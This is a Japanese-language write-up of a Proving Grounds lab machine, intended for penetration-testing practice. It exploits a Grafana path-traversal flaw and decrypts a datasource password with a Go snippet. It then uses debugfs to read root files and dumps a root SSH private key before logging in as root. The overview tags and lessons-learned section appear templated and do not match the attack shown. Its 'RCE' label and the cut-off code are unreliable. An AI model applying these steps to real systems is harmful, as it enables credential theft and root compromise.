---
title: "Proving Grounds - Fanatastic 解説 (Linux)"
date: 2026-02-25
description: "Proving Grounds Fanatastic Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-fanatastic/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Web application and exposed network services |
| 主な侵入経路 | Web RCE (CVE-2021-43798) |
| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か  
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

## 初期足がかり

---
![Screenshot from the fanatastic engagement](/assets/img/pg/fanatastic/Pasted%20image%2020260125035749.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fanatastic engagement](/assets/img/pg/fanatastic/Pasted%20image%2020260125035756.png)
*キャプション：このフェーズで取得したスクリーンショット*

![Screenshot from the fanatastic engagement](/assets/img/pg/fanatastic/Pasted%20image%2020260126024456.png)
*キャプション：このフェーズで取得したスクリーンショット*

https://github.com/jas502n/Grafana-CVE-2021-43798?source=post_page-----792d7014d7a0---------------------------------------
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
func main() {
	// decode base64str
	var grafanaIni_secretKey = "SW2YcwTIb9zpOOhoPsMm"
	var dataSourcePassword = "R3pMVVh1UHLoUkTJOl+Z/sFymLqolUOVtxCtQL/y+Q=="
	encrypted, _ := base64.StdEncoding.DecodeString(dataSourcePassword)
	PwdBytes, _ := Decrypt(encrypted, grafanaIni_secretKey)
	fmt.Println("[*] grafanaIni_secretKey= " + grafanaIni_secretKey)
	fmt.Println("[*] DataSourcePassword= " + dataSourcePassword)
	fmt.Println("[*] plainText= " + string(PwdBytes))


```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

No additional logs saved.

💡 なぜ有効か  
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
df -h /
debugfs /dev/sda2
```

```bash
sysadmin@fanatastic:~$ df -h /
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda2       9.8G  6.5G  2.9G  70% /
sysadmin@fanatastic:~$ debugfs /dev/sda2
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /root/proof.txt
a7dffe8a25fd7f1e3bc5a33b42445fa9
debugfs:  cat
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
debugfs:  cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAz1L/rbeJcJOc5T4Lppdp0oVnX0MgpfaBjW25My3ffAeJTeJwM1/R
YGtnByjnBAisdAsqctvGjZL6TewN4QNM0ew5qD2BQUU38bvq1lRdvbaD1m+WZkhp6DJrbi
42MKCUeTMY5AEPBPe4kHBN294BiUycmtLzQz5gJ99AUSQa59m6QJso4YlC7OCs7xkDAxSJ
pE56z1yaiY+y4l2akIxbAz7TVmJgRnhjJ4ZRuV2TYuSolJiSNeUyIUTozfRKl56Zs8f/QA
4Pd9AvSLZPN+s/INAULdxzgV3X9xHYh2NfRe8hw1Ju9OeJZ9lqQNBtFrit0ekpk75CJ2Z6
AMDV5tNlEcixwf/nMhjQb7Q/Oh4p7ievBk47f5t2dKlTsWw4iq1AX3FVA65n2TfD6cNISj
mxfQvXzMTPrs8KO7pHzMVQZZukOIwOEKwuZfNxIg4riGQvy4Cs+3c4w022UJ8oH36itgjr
pa4Ce+uRomYgRthDLaTNmk52TbZl0pg8AdDXB0SbAAAFgCd1RWkndUVpAAAAB3NzaC1yc2
EAAAGBAM9S/623iXCTnOU+C6aXadKFZ19DIKX2gY1tuTMt33wHiU3icDNf0WBrZwco5wQI
rHQLKnLbxo2S+k3sDeEDTNHsOag9gUFFN/G76tZUXb22g9ZvlmZIaegya24uNjCglHkzGO
QBDwT3uJBwTdveAYlMnJrS80M+YCffQFEkGufZukCbKOGJQuzgrO8ZAwMUiaROes9cmomP
suJdmpCMWwM+01ZiYEZ4YyeGUbldk2LkqJSYkjXlMiFE6M30SpeembPH/0AOD3fQL0i2Tz
frPyDQFC3cc4Fd1/cR2IdjX0XvIcNSbvTniWfZakDQbRa4rdHpKZO+QidmegDA1ebTZRHI
scH/5zIY0G+0PzoeKe4nrwZOO3+bdnSpU7FsOIqtQF9xVQOuZ9k3w+nDSEo5sX0L18zEz6
7PCju6R8zFUGWbpDiMDhCsLmXzcSIOK4hkL8uArPt3OMNNtlCfKB9+orYI66WuAnvrkaJm
IEbYQy2kzZpOdk22ZdKYPAHQ1wdEmwAAAAMBAAEAAAGAdNLfEcNHJfF3ylFQ/Vl6ns7fNf
W8cuhZjhkS77zcnqYcf4+mC7zlXYCHuKgarNI6YtVb4QbodiQo+TmXhIB4jB2hS6UErYPU
h1mNdaJqhBlRZsbQJ+iMDPRERvyxOmtx3m2li+zwyqrQDEvMA6Wwle5enHtb6js+sZkCQ/
alVpoAcqE7wwK2fIYJzFz6roSnHre+ShRzXCpl8VovW15LdqOzMI0UlQEHVmFAscQB5grU
1461bLsuqUKMMGmEkrUiAAQ3UujH2bovUZI02kOyoyijozwZXdQz1nM+LltrgFR1diOmdu
fYr23bjGRTi65Dx4Lw2a/KMiXeYvWb0u7kJ2rlEs01Vbvd2egx/TtZtqkEkWOhahO6oiAl
iwSc3734fdj6N7hcNcIj0KLqJoAdJfDtTwfdR2j8SbmtslztVEBtOU96KKUYT+XPbzaJjX
zzzA0m5TSq3mOvkm7zC6jNCnGQ2CznJTep2MlhAjIhGVbFT5Qh9pv4nr45xphqabbZAAAA
wFQQjZbLtbUxH4IuIeMqyWOmbRVoU9YC5NdWGF8ep2Ma4BEB7bBJw+g9SsT3z/rumzQeo3
2Eigs3NRsqULsQqr/Ts80AzjPuG11WU4p/5D+8dQhTyoseMPeg9JwveiZLZRJnlER3Bi2M
zv9mWw8ByNcWY0tyNTrQj5pUTLhhukMqRonMYV/qsAZVZs8VGvWT90NEVs9VL5bP22QDGO
mhkLPbQpBsrUBGBn53euvpw0DvnPI9YUrvzaQZjVDQU3uIcgAAAMEA/0jDXV/NDkTzvdlp
ZMgBvIPJAdWpiEj0GzsaBMlj5dDNTarsr1j82lYIXmG8S+T8E/iSRe0cvasxOM3tseIBVq
EFdhim3jh/mMKX1DfBMDShM5Q7xZr4eczl6xyJ1Qs4Nu3RHszWeeiqYXJeHjbpySnZ/Wec
atyS247gMCb2jYMXX8khnkHj1BWp1bHTpQuI/3oxrVSZVXbfUmfbJbsMtXlVgM3+5yqeny
29f1ZFlpb1NyhFe4U3plbXjLLwwY+PAAAAwQDP58+hi3mm0UoPaQXSFIQ2XPsc1TnxVZkF
WTKAu4jtHPrF9p19nZS3j3AJ0ndr0niWW9gGmQtjz56m06TtBCQAQw8P3ITt5uBkxRuwpd
fC7bp88+tDwg47yGdnHe4/bsX90J8x+/WVa2LbK/7Fh64djpoeN4WAHfKB/fmXGJ+kt0mu
qDz911lrLT9H8CrpYXlrKy5jxhO8yxqU1CqmZe8H8ILFMPyuw8UuOCF7EnhLR2ReAmOS2l
T3skewpHe8tDUAAAALcm9vdEB1YnVudHU=
-----END OPENSSH PRIVATE KEY-----
debugfs:

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
ssh root@$ip -i id_rsa
ls -la
cat proof.txt
```

```bash
✅[23:27][CPU:25][MEM:73][TUN0:192.168.45.178][...Proving_Ground/Fanatastic]
🐉 > ssh root@$ip -i id_rsa

root@fanatastic:~# ls -la
total 40
drwx------  6 root root 4096 Jan 24 18:48 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root    9 Feb  4  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Mar  1  2022 .cache
drwxr-xr-x  3 root root 4096 Jan  7  2021 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   33 Jan 24 18:48 proof.txt
drwxr-xr-x  3 root root 4096 Jan  7  2021 snap
drwx------  2 root root 4096 Feb  4  2022 .ssh
-rw-r--r--  1 root root  165 Feb  4  2022 .wget-hsts
root@fanatastic:~# cat proof.txt
a7dffe8a25fd7f1e3bc5a33b42445fa9
root@fanatastic:~#

```

![Screenshot from the fanatastic engagement](/assets/img/pg/fanatastic/Pasted%20image%2020260126232918.png)
*キャプション：このフェーズで取得したスクリーンショット*

💡 なぜ有効か  
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1<br/>偵察"]
        direction TB
        K1A[ポートスキャン<br/>Rustscan/Nmap]
        K1B[サービス列挙<br/>22/3000/9090]
        K1C[Grafana発見<br/>Port 3000]
        K1D[バージョン特定<br/>Grafana 8.3.0]
        
        K1A --> K1B --> K1C --> K1D
    end
    
    subgraph KC2["Kill Chain 2<br/>初期侵入"]
        direction TB
        K2A[脆弱性特定<br/>CVE-2021-43798]
        K2B[Path Traversal<br/>--path-as-is]
        K2C[ファイル読取<br/>/etc/passwd]
        K2D[設定取得<br/>grafana.ini]
        
        K2A --> K2B --> K2C --> K2D
    end
    
    subgraph KC3["Kill Chain 3<br/>認証情報取得"]
        direction TB
        K3A[DB抽出<br/>grafana.db]
        K3B[Secret Key発見<br/>SW2YcwTIb...]
        K3C[AES復号化<br/>AESDecrypt.go]
        K3D["パスワード判明<br/>SuperSecureP@ssw0rd"]
        
        K3A --> K3B --> K3C --> K3D
    end
    
    subgraph KC4["Kill Chain 4<br/>横移動"]
        direction TB
        K4A[SSH接続<br/>sysadmin]
        K4B[シェル確立<br/>uid=1001]
        K4C[環境確認<br/>id/groups]
        K4D[local.txt取得<br/>2c83a703...]
        
        K4A --> K4B --> K4C --> K4D
    end
    
    subgraph KC5["Kill Chain 5<br/>権限昇格準備"]
        direction TB
        K5A[自動列挙<br/>LinPEAS実行]
        K5B[diskグループ確認<br/>groups=1001,6]
        K5C[CVE確認<br/>PwnKit検出]
        K5D[攻撃経路決定<br/>disk abuse]
        
        K5A --> K5B --> K5C --> K5D
    end
    
    subgraph KC6["Kill Chain 6<br/>権限昇格"]
        direction TB
        K6A[debugfs起動<br/>/dev/sda2]
        K6B[ディスク直接アクセス<br/>FS操作]
        K6C[SSH Key抽出<br/>/root/.ssh/id_rsa]
        K6D[秘密鍵取得<br/>OpenSSH Format]
        
        K6A --> K6B --> K6C --> K6D
    end
    
    subgraph KC7["Kill Chain 7<br/>目標達成"]
        direction TB
        K7A[root SSH<br/>ssh -i id_rsa]
        K7B[rootシェル確立<br/>uid=0]
        K7C[proof.txt取得<br/>a7dffe8a...]
        K7D[完了<br/>Mission Success]
        
        K7A --> K7B --> K7C --> K7D
    end
    
    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7
    
    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b2dfdb
    style KC7 fill:#81d4fa
    style K7B fill:#ff6b6b,color:#fff
```

## 参考文献

- CVE-2021-43798: https://nvd.nist.gov/vuln/detail/CVE-2021-43798
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
